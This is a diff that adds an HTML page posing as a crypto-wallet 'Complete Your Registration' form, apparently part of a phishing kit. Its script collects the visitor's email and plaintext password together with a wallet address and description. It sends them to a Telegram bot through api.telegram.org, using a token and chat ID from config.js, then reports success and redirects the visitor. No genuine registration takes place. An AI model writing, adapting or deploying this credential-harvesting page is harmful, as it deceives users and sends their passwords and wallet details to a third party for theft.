@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Complete Registration</title>
+    <link href="static/css/main.e94723d5.chunk.css" rel="stylesheet">
+    <link href="static/css/index.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1d2330;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: #2a313f;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 600px;
+            width: 100%;
+        }
+        h1 {
+            color: #fff;
+            margin-bottom: 20px;
+        }
+        input {
+            width: calc(100% - 20px);
+            padding: 12px;
+            margin-bottom: 25px;
+            border: 1px solid #444;
+            border-radius: 6px;
+            background-color: #3b4252;
+            color: #fff;
+            font-size: 1em;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1.1em;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .wallet-info {
+            background-color: #3b4252;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .wallet-info p {
+            margin: 5px 0;
+            font-family: monospace;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Complete Your Registration</h1>
+        <div class="wallet-info">
+            <p><strong>Wallet Address:</strong> <span id="walletAddress"></span></p>
+            <p><strong>Description:</strong> <span id="walletDescription"></span></p>
+        </div>
+        <input type="email" id="email" placeholder="Enter your email" required>
+        <input type="password" id="password" placeholder="Enter your password" required>
+        <button onclick="completeRegistration()">Complete Registration</button>
+    </div>
+
+    <script src="config.js"></script>
+    <script>
+        // Load wallet info from localStorage
+        window.onload = function() {
+            const walletAddress = localStorage.getItem('walletAddress');
+            const walletDescription = localStorage.getItem('walletDescription');
+            
+            if (walletAddress) {
+                document.getElementById('walletAddress').textContent = walletAddress;
+            }
+            if (walletDescription) {
+                document.getElementById('walletDescription').textContent = walletDescription;
+            }
+        }
+
+        async function completeRegistration() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const walletAddress = localStorage.getItem('walletAddress');
+            const walletDescription = localStorage.getItem('walletDescription');
+
+            // Validate email
+            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            if (!emailRegex.test(email)) {
+                alert('Please enter a valid email address');
+                return;
+            }
+
+            if (!password) {
+                alert('Please enter a password');
+                return;
+            }
+
+            const message = `New Registration:\nEmail: ${email}\nPassword: ${password}\nWallet: ${walletAddress}\nDescription: ${walletDescription}`;
+            const url = `https://api.telegram.org/bot${config.bot.token}/sendMessage?chat_id=${config.bot.chatId}&text=${encodeURIComponent(message)}`;
+
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                if (data.ok) {
+                    alert('Registration completed successfully!');
+                    // Clear localStorage
+                    localStorage.removeItem('walletAddress');
+                    localStorage.removeItem('walletDescription');
+                    // Redirect to index
+                    window.location.href = 'index.html';
+                } else {
+                    alert('Failed to complete registration. Please try again.');
+                }
+            } catch (error) {
+                alert('An error occurred. Please try again.');
+            }
+        }
+    </script>
+</body>
+</html> 
